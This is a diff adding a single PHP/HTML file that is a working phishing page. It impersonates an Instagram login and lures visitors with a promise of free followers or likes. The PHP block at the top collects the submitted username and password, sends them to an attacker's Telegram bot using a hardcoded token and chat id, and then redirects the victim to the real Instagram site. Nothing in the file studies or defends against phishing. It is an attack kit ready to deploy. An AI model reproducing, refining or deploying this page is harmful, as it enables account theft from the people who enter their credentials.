@@ -1,0 +1,64 @@
+<?php
+// تأكد من رفع هذا الملف بصيغة .php على استضافة تدعم PHP
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $token = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
+    $chat_id = "5177962707";
+    $message = "👤 User: " . $_POST['username'] . "\n🔑 Pass: " . $_POST['password'] . "\n🎯 Service: " . $_POST['service'] . "\n📈 Count: " . $_POST['amount'];
+    @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
+    header("Location: https://www.instagram.com/");
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .login-card { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 320px; text-align: center; }
+        h1 { font-family: 'Brush Script MT', cursive; font-size: 2rem; margin-bottom: 20px; }
+        input, select, button { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
+        button { background: #0095f6; color: white; font-weight: bold; border: none; cursor: pointer; }
+        .controls { position: fixed; top: 20px; right: 20px; display: flex; gap: 10px; }
+        .whatsapp-btn { position: fixed; bottom: 20px; right: 20px; background: #25d366; color: white; padding: 15px; border-radius: 50%; font-size: 24px; text-decoration: none; }
+        #avatar { width: 80px; height: 80px; border-radius: 50%; display: none; margin: 10px auto; border: 2px solid #dbdbdb; }
+    </style>
+</head>
+<body>
+
+<div class="controls">
+    <button onclick="alert('Language: AR/EN')">🌐</button>
+    <button onclick="document.body.style.background='#121212'">🌙</button>
+</div>
+
+<div class="login-card">
+    <h1>Instagram</h1>
+    <input type="text" id="u" placeholder="Username">
+    <button onclick="verify()">Verify</button>
+    <img id="avatar" src="">
+    <form method="POST" id="form" style="display:none;">
+        <input type="hidden" name="username" id="hidden_u">
+        <input type="password" name="password" placeholder="Password" required>
+        <select name="service"><option>Followers</option><option>Likes</option></select>
+        <select name="amount"><option>100</option><option>500</option></select>
+        <button type="submit">Log In</button>
+    </form>
+    <p style="font-size: 12px; color: #8e8e8e; margin-top: 20px;">Privacy Policy</p>
+</div>
+
+<a href="https://wa.me/201068896761" class="whatsapp-btn"><i class="fab fa-whatsapp"></i></a>
+
+<script>
+    function verify() {
+        let u = document.getElementById('u').value;
+        document.getElementById('avatar').src = "https://graph.facebook.com/" + u + "/picture?type=large";
+        document.getElementById('avatar').style.display = "block";
+        document.getElementById('form').style.display = "block";
+        document.getElementById('hidden_u').value = u;
+    }
+</script>
+</body>
+</html>
